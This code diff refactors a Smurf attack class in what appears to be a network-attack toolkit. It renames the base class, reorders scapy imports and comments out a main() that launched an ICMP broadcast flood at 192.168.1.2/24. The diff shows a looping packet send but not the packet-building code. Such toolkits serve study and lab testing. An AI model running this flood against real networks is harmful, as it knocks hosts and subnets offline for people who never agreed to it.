@@ -1,9 +1,10 @@
-from src.attacker import Attacker
-
 from netaddr import IPNetwork
-from scapy.all import IP, ICMP, send
+from scapy.all import ICMP, IP, send
 
-class Smurf(Attacker):
+from netattacker.attacker import AttackerBaseClass
+
+
+class Smurf(AttackerBaseClass):
 	"""
 	Parameters
 	----------
@@ -51,11 +52,11 @@ class Smurf(Attacker):
 		print("[*] SMURF attack started")
 		send(pkt, verbose=False, loop=True)
 
-def main():
-	a = Smurf("192.168.1.2", "24")
-	a.print_broadcast_addr()
-	a.print_target_ip()
-	a.start()
+# def main():
+# 	a = Smurf("192.168.1.2", "24")
+# 	a.print_broadcast_addr()
+# 	a.print_target_ip()
+# 	a.start()
 
-if __name__ == "__main__":
-	main()
+# if __name__ == "__main__":
+# 	main()
